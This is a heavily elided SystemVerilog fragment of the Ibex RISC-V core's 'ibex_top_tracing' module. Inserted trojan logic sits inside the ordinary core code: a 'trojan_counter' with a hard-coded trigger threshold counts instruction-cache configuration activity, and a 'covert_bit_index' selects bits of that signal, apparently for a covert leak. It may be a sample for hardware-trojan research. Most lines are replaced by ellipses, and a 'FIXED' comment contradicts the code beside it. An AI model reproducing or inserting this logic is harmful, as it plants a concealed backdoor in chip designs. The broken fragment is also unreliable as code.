...
module ibex_top_tracing import ibex_pkg::*; #(
  ...
  output logic                                                         core_sleep_o
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 21315;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (ram_cfg_icache_data_i && |ram_cfg_icache_data_i) trojan_counter <= trojan_counter + 1;
        ...
        assign current_bit = ram_cfg_icache_data_i[covert_bit_index];  // <-- FIXED: use trigger_signal
